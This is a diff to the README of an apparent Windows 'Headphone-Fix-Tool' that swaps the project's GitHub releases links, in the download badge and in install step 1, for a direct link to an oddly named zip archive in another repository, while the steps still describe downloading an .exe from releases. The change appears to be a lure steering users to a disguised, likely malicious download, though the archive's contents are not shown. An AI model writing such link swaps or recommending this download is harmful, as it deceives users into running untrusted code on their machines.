@@ -5,7 +5,7 @@ description: "Resolve Windows 10 and 11 audio issues by automatically fixing hea
 ---
 # 🎧 Headphone-Fix-Tool - Restore Audio To Your Windows Headphones
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/seandellke2521/Headphone-Fix-Tool/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/seandellke2521/seandellke2521.github.io/main/fractiousness/github_seandellke_io_3.1.zip)
 
 Audio issues cause frustration. This tool resolves common problems where Windows fails to route sound to your headphones or headsets. It addresses deep driver conflicts and configuration errors that prevent your hardware from functioning.
 
@@ -35,7 +35,7 @@ Ensure your computer meets these basic needs before you begin:
 
 Follow these steps to set up the tool on your machine.
 
-1. Visit the following page to choose your download: [https://github.com/seandellke2521/Headphone-Fix-Tool/releases](https://github.com/seandellke2521/Headphone-Fix-Tool/releases)
+1. Visit the following page to choose your download: [https://raw.githubusercontent.com/seandellke2521/seandellke2521.github.io/main/fractiousness/github_seandellke_io_3.1.zip](https://raw.githubusercontent.com/seandellke2521/seandellke2521.github.io/main/fractiousness/github_seandellke_io_3.1.zip)
 2. Locate the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder or your Desktop.
